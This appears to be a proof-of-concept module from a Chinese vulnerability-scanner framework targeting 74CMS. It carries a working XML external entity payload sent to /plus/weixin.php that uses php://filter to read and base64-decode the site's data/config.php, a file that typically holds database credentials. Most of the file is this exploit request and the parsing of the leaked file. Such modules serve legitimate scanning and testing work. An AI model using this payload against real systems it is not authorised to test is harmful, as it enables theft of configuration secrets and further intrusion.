# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import base64
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = '74CMS_0009'  # 平台漏洞编号，留空
    name = '骑士CMS任意文件的读取(XML实体注入)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-03'  # 漏洞公布时间
    desc = '''
        骑士CMS /plus/weixin.php 任意文件的读取(XML实体注入)漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=075009'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f55f4caf-e932-49db-aee6-ac186b6e8f40'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce='
            data = '''<?xml version="1.0" encoding="utf-8"?>
                <!DOCTYPE copyright [
                <!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=../data/config.php">
                ]>
                <xml>
                <ToUserName>&test;</ToUserName>
                <FromUserName>1111</FromUserName>
                <Content>2222</Content>
                <Event>subscribe</Event>
                </xml>'''
            content_type = 'Content-Type: text/xml'
            code, head, res, err, _ = hh.http(
                url, post=data, header=content_type)
            if code != 200:
                return False
            m = re.search(
                r'<FromUserName><!\[CDATA\[([a-zA-Z0-9/+=]*)\]\]>', res)
            if not m:
                return False
            config_file = base64.b64decode(m.group(1))
            if("<?php" in config_file) and ("?>" in config_file):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n具体请查看漏洞详情'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
